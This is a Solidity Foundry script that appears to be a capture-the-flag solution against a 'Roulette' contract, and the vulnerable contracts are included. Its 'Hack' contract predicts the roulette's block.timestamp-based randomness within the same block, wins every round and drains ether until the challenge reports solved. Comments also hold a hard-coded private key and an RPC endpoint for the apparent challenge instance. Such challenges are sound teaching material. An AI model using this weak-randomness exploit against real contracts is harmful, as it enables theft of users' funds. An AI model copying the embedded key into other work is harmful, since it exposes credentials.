// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0x0D78724449cE8CaBD2E178544Aa624c5273E9F1c);
    address wallet = 0x4d605CC6a20bfC06163d9BEfAE0f486Bb7000081;
    Roulette public roulette = setup.roulette();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0x1ae95c53e1cd5befb8af28593ee2392798fedc35379d4bdb5d1ae3723745c2e1);

        console.log(wallet.balance);

        Hack hack = new Hack(address(roulette));
        hack.solve();


        console.log(setup.isSolved());


        vm.stopBroadcast();
    }
}

// UUID	0bf6f949-d68e-400f-add0-aef70ac179b5
// RPC Endpoint	http://103.178.153.113:40004/0bf6f949-d68e-400f-add0-aef70ac179b5
// Private Key	0x1ae95c53e1cd5befb8af28593ee2392798fedc35379d4bdb5d1ae3723745c2e1
// Setup Contract	0x0D78724449cE8CaBD2E178544Aa624c5273E9F1c
// Wallet	0x4d605CC6a20bfC06163d9BEfAE0f486Bb7000081

contract Hack {
    Roulette public roulette;

    constructor(address _chall) {
        roulette = Roulette(_chall);
    }

    function solve() external {
        uint256 guess = uint256(keccak256(abi.encodePacked(block.timestamp)));

        for(uint256 i = 0; i < 5; i++) {
            roulette.playRoulette(guess % 100);
        }
        
        for(uint256 i = 0; i < 2; i++) {
            roulette.playBiggerRoulette(guess % 10000000);
        }
    }

    receive() external payable {}
}

contract Setup{
    Roulette public roulette;

    constructor() payable {
        roulette = new Roulette{value: 30 ether}();
    }

    function isSolved() public view returns(bool){
        return roulette.stolenEnough();
    }
}

contract Roulette{

    bool public stolenEnough = false;
    mapping(address => uint) public wonRoulette;

    modifier _kickedOut(){
        require(wonRoulette[msg.sender] <= 100, "You've stolen enough, get out!");
        _;
    }

    modifier _hasStolenEnough(){
        _;
        if(address(msg.sender).balance > 20 ether){
            stolenEnough = true;
        }
    }

    constructor() payable {}

    function randomGenerator() internal view returns(uint256){
        return uint256(keccak256(abi.encodePacked(block.timestamp))) % 100;
    }

    function biggerRandomGenerator() internal view returns(uint256){
        return uint256(keccak256(abi.encodePacked(block.timestamp))) % 10000000;
    }

    function playRoulette(uint256 _guess) public _kickedOut{
        require(wonRoulette[msg.sender] < 5, "You cannot play this game again!");
        uint256 playerGuess = _guess;
        uint256 randomNumber = randomGenerator();
        if(randomNumber == playerGuess){
            wonRoulette[msg.sender]++;
            (bool winningMoney, ) = msg.sender.call{value: 1 ether}("");
            require(winningMoney, "Fail to claim winning money");
        }
    }

    function playBiggerRoulette(uint256 _guess) public _kickedOut _hasStolenEnough{
        require(wonRoulette[msg.sender] >= 5, "You haven't met the requirement to play the game!");
        uint256 playerGuess = _guess;
        uint256 randomNumber = biggerRandomGenerator();
        if(randomNumber == playerGuess){
            wonRoulette[msg.sender] += 50;
            (bool winningMoney, ) = msg.sender.call{value: 10 ether}("");
            require(winningMoney, "Fail to claim winning money");
        }
    }
    
}